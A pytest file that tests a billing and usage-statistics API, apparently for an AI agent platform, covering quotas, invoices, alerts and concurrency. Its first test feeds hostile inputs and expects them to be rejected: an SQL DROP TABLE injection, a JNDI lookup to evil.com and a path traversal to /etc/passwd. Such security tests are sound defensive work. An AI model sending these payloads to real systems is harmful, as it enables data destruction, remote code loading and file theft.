import pytest
import asyncio
from httpx import AsyncClient

class TestBillingComplete:
    """计费统计模块完整测试 - 基于后端测试用例.md"""

    # P0-BILLING-001: 计费数据注入测试
    @pytest.mark.asyncio
    async def test_billing_data_injection(self, auth_client: AsyncClient):
        """计费数据注入测试"""
        malicious_data = [
            {"cost": -100},  # 负数金额
            {"tokens_used": "'; DROP TABLE usage; --"},
            {"execution_time": "${jndi:ldap://evil.com/}"},
            {"agent_id": "../../etc/passwd"}
        ]
        
        for data in malicious_data:
            response = await auth_client.post("/api/v1/Billing/quotas", json={
                "user_id": 1,
                "agent_id": 1,
                **data
            })
            assert response.status_code in [400, 422, 401]

    # P0-BILLING-002: 数值边界测试
    @pytest.mark.asyncio
    async def test_billing_numeric_boundaries(self, auth_client: AsyncClient):
        """数值边界测试"""
        test_cases = [
            {"cost": 0},  # 零成本
            {"cost": 999999999.99},  # 大数值
            {"tokens_used": 0},  # 零token
            {"tokens_used": 2147483647},  # 最大整数
            {"execution_time": 0.0},  # 零时间
            {"execution_time": 86400.0}  # 24小时
        ]
        
        for case in test_cases:
            response = await auth_client.post("/api/v1/Billing/quotas", json={
                "user_id": 1,
                "agent_id": 1,
                **case
            })
            assert response.status_code in [200, 400, 422, 401]

    # P0-BILLING-003: 统计数据一致性测试
    @pytest.mark.asyncio
    async def test_billing_stats_consistency(self, auth_client: AsyncClient):
        """统计数据一致性测试"""
        # 创建使用记录
        await auth_client.post("/api/v1/Execution/", json={
            "workflow_id": 1,
            "agent_id": 1,
            "input_data": '{"test": "data"}'
        })
        
        # 获取统计数据
        response = await auth_client.get("/api/v1/Billing/usage")
        assert response.status_code in [200, 401, 404, 500]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # P0-BILLING-004: 并发计费测试
    @pytest.mark.asyncio
    async def test_concurrent_billing_updates(self, auth_client: AsyncClient):
        """并发计费测试"""
        results = []
        
        async def update_quota():
            response = await auth_client.post("/api/v1/Billing/quotas/1/usage", json={
                "tokens_used": 10,
                "cost": 0.05
            })
            return response.status_code
        
        # 创建多个并发更新
        tasks = [update_quota() for _ in range(10)]
        results = await asyncio.gather(*tasks)
        
        # 验证没有系统崩溃
        assert all(status in [200, 404, 400, 401, 500] for status in results)

    # 使用量统计测试
    @pytest.mark.asyncio
    async def test_billing_usage_stats(self, auth_client: AsyncClient):
        """使用量统计测试"""
        response = await auth_client.get("/api/v1/Billing/usage-stats")
        assert response.status_code in [200, 401, 404, 500]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data
            stats = data["data"]
            assert "total_executions" in stats
            assert "total_tokens" in stats
            assert "total_cost" in stats

    # Agent使用量明细测试
    @pytest.mark.asyncio
    async def test_billing_agent_usage(self, auth_client: AsyncClient):
        """Agent使用量明细测试"""
        response = await auth_client.get("/api/v1/Billing/agent-usage")
        assert response.status_code in [200, 401, 404, 500]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data
            assert isinstance(data["data"], list)

    # 使用量历史记录测试
    @pytest.mark.asyncio
    async def test_billing_usage_history(self, auth_client: AsyncClient):
        """使用量历史记录测试"""
        response = await auth_client.get("/api/v1/Billing/usage-history")
        assert response.status_code in [200, 401, 404, 500]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data
            assert isinstance(data["data"], list)

    # 成本配额管理测试
    @pytest.mark.asyncio
    async def test_cost_quota_management(self, auth_client: AsyncClient):
        """成本配额管理测试"""
        # 创建配额
        create_response = await auth_client.post("/api/v1/Billing/quotas", json={
            "user_id": 1,
            "agent_id": 1,
            "monthly_limit": 100.0,
            "daily_limit": 10.0
        })
        assert create_response.status_code in [200, 400, 422, 401]
        
        if create_response.status_code == 200:
            quota_id = create_response.json()["data"]["id"]
            
            # 更新配额
            update_response = await auth_client.put(f"/api/v1/Billing/quotas/{quota_id}", json={
                "monthly_limit": 200.0
            })
            assert update_response.status_code in [200, 404, 401]
            
            # 获取配额
            get_response = await auth_client.get(f"/api/v1/Billing/quotas/{quota_id}")
            assert get_response.status_code in [200, 404, 401]

    # 发票管理测试
    @pytest.mark.asyncio
    async def test_billing_invoice_management(self, auth_client: AsyncClient):
        """发票管理测试"""
        # 创建发票
        create_response = await auth_client.post("/api/v1/Billing/invoices", json={
            "user_id": 1,
            "amount": 50.0,
            "period": "2023-12",
            "items": [
                {"description": "Agent usage", "amount": 30.0},
                {"description": "Execution fees", "amount": 20.0}
            ]
        })
        assert create_response.status_code in [200, 400, 422, 401]
        
        if create_response.status_code == 200:
            invoice_id = create_response.json()["data"]["id"]
            
            # 更新发票状态
            update_response = await auth_client.put(f"/api/v1/Billing/invoices/{invoice_id}", json={
                "status": "paid"
            })
            assert update_response.status_code in [200, 404, 401]

    # 预警管理测试
    @pytest.mark.asyncio
    async def test_billing_alert_management(self, auth_client: AsyncClient):
        """预警管理测试"""
        # 创建预警
        create_response = await auth_client.post("/api/v1/Billing/alerts", json={
            "user_id": 1,
            "type": "quota_exceeded",
            "threshold": 80.0,
            "enabled": True
        })
        assert create_response.status_code in [200, 400, 422, 401]
        
        if create_response.status_code == 200:
            alert_id = create_response.json()["data"]["id"]
            
            # 更新预警
            update_response = await auth_client.put(f"/api/v1/Billing/alerts/{alert_id}", json={
                "threshold": 90.0
            })
            assert update_response.status_code in [200, 404, 401]

    # 实时监控测试
    @pytest.mark.asyncio
    async def test_billing_real_time_monitoring(self, auth_client: AsyncClient):
        """实时监控测试"""
        response = await auth_client.get("/api/v1/Billing/real-time")
        assert response.status_code in [200, 404, 401]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # 分析报告测试
    @pytest.mark.asyncio
    async def test_billing_analytics(self, auth_client: AsyncClient):
        """分析报告测试"""
        response = await auth_client.get("/api/v1/Billing/analytics")
        assert response.status_code in [200, 404, 401]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # 导出功能测试
    @pytest.mark.asyncio
    async def test_billing_export(self, auth_client: AsyncClient):
        """导出功能测试"""
        response = await auth_client.get("/api/v1/Billing/export")
        assert response.status_code in [200, 404, 401]
        
        if response.status_code == 200:
            # 验证导出格式
            content_type = response.headers.get("content-type", "")
            assert "json" in content_type or "csv" in content_type or "xlsx" in content_type

    # 过滤功能测试
    @pytest.mark.asyncio
    async def test_billing_filtering(self, auth_client: AsyncClient):
        """过滤功能测试"""
        # 按日期范围过滤
        response = await auth_client.get("/api/v1/Billing/usage?start_date=2023-01-01&end_date=2023-12-31")
        assert response.status_code in [200, 401, 404, 500]
        
        # 按用户过滤
        response = await auth_client.get("/api/v1/Billing/usage?user_id=1")
        assert response.status_code in [200, 401, 404, 500]
        
        # 按Agent过滤
        response = await auth_client.get("/api/v1/Billing/usage?agent_id=1")
        assert response.status_code in [200, 401, 404, 500]

    # 分页功能测试
    @pytest.mark.asyncio
    async def test_billing_pagination(self, auth_client: AsyncClient):
        """分页功能测试"""
        response = await auth_client.get("/api/v1/Billing/usage?skip=0&limit=10")
        assert response.status_code in [200, 401, 404, 500]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data
            assert "total" in data
            assert isinstance(data["data"], list)

    # 聚合功能测试
    @pytest.mark.asyncio
    async def test_billing_aggregation(self, auth_client: AsyncClient):
        """聚合功能测试"""
        response = await auth_client.get("/api/v1/Billing/usage?aggregate=daily")
        assert response.status_code in [200, 401, 404, 500]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # 数据验证测试
    @pytest.mark.asyncio
    async def test_billing_validation(self, auth_client: AsyncClient):
        """数据验证测试"""
        # 测试无效的成本值
        invalid_costs = [-100, "invalid", None]
        
        for cost in invalid_costs:
            response = await auth_client.post("/api/v1/Billing/quotas", json={
                "user_id": 1,
                "agent_id": 1,
                "monthly_limit": cost
            })
            assert response.status_code in [400, 422, 401]

    # 性能测试
    @pytest.mark.asyncio
    async def test_billing_performance(self, auth_client: AsyncClient):
        """性能测试"""
        import time
        
        start_time = time.time()
        response = await auth_client.get("/api/v1/Billing/usage")
        end_time = time.time()
        
        assert response.status_code in [200, 401, 404, 500]
        if response.status_code == 200:
            assert (end_time - start_time) < 2.0

    # 错误处理测试
    @pytest.mark.asyncio
    async def test_billing_error_handling(self, auth_client: AsyncClient):
        """错误处理测试"""
        # 测试无效的JSON
        response = await auth_client.post("/api/v1/Billing/quotas", 
                                         content="invalid json",
                                         headers={"Content-Type": "application/json"})
        assert response.status_code in [400, 422]
        
        # 测试缺少必需字段
        response = await auth_client.post("/api/v1/Billing/quotas", json={})
        assert response.status_code in [400, 422, 401]

    # 响应格式测试
    @pytest.mark.asyncio
    async def test_billing_response_format(self, auth_client: AsyncClient):
        """响应格式测试"""
        response = await auth_client.get("/api/v1/Billing/usage")
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # 货币支持测试
    @pytest.mark.asyncio
    async def test_billing_currency_support(self, auth_client: AsyncClient):
        """货币支持测试"""
        currencies = ["USD", "EUR", "CNY", "JPY"]
        
        for currency in currencies:
            response = await auth_client.post("/api/v1/Billing/quotas", json={
                "user_id": 1,
                "agent_id": 1,
                "monthly_limit": 100.0,
                "currency": currency
            })
            assert response.status_code in [200, 400, 422, 401]

    # 时区支持测试
    @pytest.mark.asyncio
    async def test_billing_timezone_support(self, auth_client: AsyncClient):
        """时区支持测试"""
        timezones = ["UTC", "Asia/Shanghai", "America/New_York"]
        
        for timezone in timezones:
            response = await auth_client.get(f"/api/v1/Billing/usage?timezone={timezone}")
            assert response.status_code in [200, 401, 404, 500]

    # 限流测试
    @pytest.mark.asyncio
    async def test_billing_rate_limiting(self, auth_client: AsyncClient):
        """限流测试"""
        results = []
        
        async def make_request():
            response = await auth_client.get("/api/v1/Billing/usage")
            return response.status_code
        
        # 快速发送多个请求
        tasks = [make_request() for _ in range(20)]
        results = await asyncio.gather(*tasks)
        
        # 验证没有系统崩溃
        assert all(status in [200, 401, 404, 429, 500] for status in results)

    # 并发计算测试
    @pytest.mark.asyncio
    async def test_billing_concurrent_calculations(self, auth_client: AsyncClient):
        """并发计算测试"""
        results = []
        
        async def calculate_usage():
            response = await auth_client.post("/api/v1/Billing/calculate", json={
                "executions": [
                    {"tokens_used": 100, "duration": 60},
                    {"tokens_used": 200, "duration": 120}
                ]
            })
            return response.status_code
        
        # 创建多个并发计算
        tasks = [calculate_usage() for _ in range(10)]
        results = await asyncio.gather(*tasks)
        
        # 验证没有系统崩溃
        assert all(status in [200, 400, 422, 401, 500] for status in results)

    # 通知功能测试
    @pytest.mark.asyncio
    async def test_billing_notifications(self, auth_client: AsyncClient):
        """通知功能测试"""
        # 创建通知配置
        notification_config = {
            "email": "admin@example.com",
            "webhook": "https://webhook.example.com/billing",
            "events": ["quota_exceeded", "invoice_generated"]
        }
        
        response = await auth_client.post("/api/v1/Billing/notifications", json=notification_config)
        assert response.status_code in [200, 400, 422, 401]

    # 权限测试
    @pytest.mark.asyncio
    async def test_billing_permissions(self, auth_client: AsyncClient):
        """权限测试"""
        # 测试跨用户数据访问
        response = await auth_client.get("/api/v1/Billing/quotas?user_id=999")
        assert response.status_code in [401, 403, 404, 200]  # 可能没有权限控制

    # 审计跟踪测试
    @pytest.mark.asyncio
    async def test_billing_audit_trail(self, auth_client: AsyncClient):
        """审计跟踪测试"""
        response = await auth_client.get("/api/v1/Billing/audit")
        assert response.status_code in [200, 404, 401]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # 合规性测试
    @pytest.mark.asyncio
    async def test_billing_compliance(self, auth_client: AsyncClient):
        """合规性测试"""
        response = await auth_client.get("/api/v1/Billing/compliance")
        assert response.status_code in [200, 404, 401]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # 备份恢复测试
    @pytest.mark.asyncio
    async def test_billing_backup_restore(self, auth_client: AsyncClient):
        """备份恢复测试"""
        # 备份数据
        backup_response = await auth_client.post("/api/v1/Billing/backup")
        assert backup_response.status_code in [200, 404, 401]
        
        if backup_response.status_code == 200:
            backup_id = backup_response.json()["data"].get("backup_id")
            if backup_id:
                # 恢复数据
                restore_response = await auth_client.post(f"/api/v1/Billing/restore/{backup_id}")
                assert restore_response.status_code in [200, 404, 401]

    # 数据完整性测试
    @pytest.mark.asyncio
    async def test_billing_data_integrity(self, auth_client: AsyncClient):
        """数据完整性测试"""
        # 创建使用记录
        await auth_client.post("/api/v1/Execution/", json={
            "workflow_id": 1,
            "agent_id": 1,
            "input_data": '{"test": "data"}'
        })
        
        # 验证数据一致性
        response = await auth_client.get("/api/v1/Billing/integrity-check")
        assert response.status_code in [200, 404, 401]

    # 报表生成测试
    @pytest.mark.asyncio
    async def test_billing_report_generation(self, auth_client: AsyncClient):
        """报表生成测试"""
        response = await auth_client.post("/api/v1/Billing/reports", json={
            "type": "monthly",
            "period": "2023-12",
            "format": "pdf"
        })
        assert response.status_code in [200, 404, 401, 422]
        
        if response.status_code == 200:
            report_id = response.json()["data"]["id"]
            
            # 获取报表
            get_response = await auth_client.get(f"/api/v1/Billing/reports/{report_id}")
            assert get_response.status_code in [200, 404, 401]

    # 成本分析测试
    @pytest.mark.asyncio
    async def test_billing_cost_analysis(self, auth_client: AsyncClient):
        """成本分析测试"""
        response = await auth_client.get("/api/v1/Billing/cost-analysis")
        assert response.status_code in [200, 404, 401]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # 使用模式分析测试
    @pytest.mark.asyncio
    async def test_billing_usage_patterns(self, auth_client: AsyncClient):
        """使用模式分析测试"""
        response = await auth_client.get("/api/v1/Billing/usage-patterns")
        assert response.status_code in [200, 404, 401]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # 预测分析测试
    @pytest.mark.asyncio
    async def test_billing_forecasting(self, auth_client: AsyncClient):
        """预测分析测试"""
        response = await auth_client.get("/api/v1/Billing/forecast")
        assert response.status_code in [200, 404, 401]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # 预算管理测试
    @pytest.mark.asyncio
    async def test_billing_budget_management(self, auth_client: AsyncClient):
        """预算管理测试"""
        # 创建预算
        create_response = await auth_client.post("/api/v1/Billing/budgets", json={
            "user_id": 1,
            "monthly_budget": 1000.0,
            "alert_threshold": 80.0
        })
        assert create_response.status_code in [200, 400, 422, 401]
        
        if create_response.status_code == 200:
            budget_id = create_response.json()["data"]["id"]
            
            # 获取预算状态
            status_response = await auth_client.get(f"/api/v1/Billing/budgets/{budget_id}/status")
            assert status_response.status_code in [200, 404, 401]

    # 统计汇总测试
    @pytest.mark.asyncio
    async def test_billing_summary(self, auth_client: AsyncClient):
        """统计汇总测试"""
        response = await auth_client.get("/api/v1/Billing/summary")
        assert response.status_code in [200, 404, 401]
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data
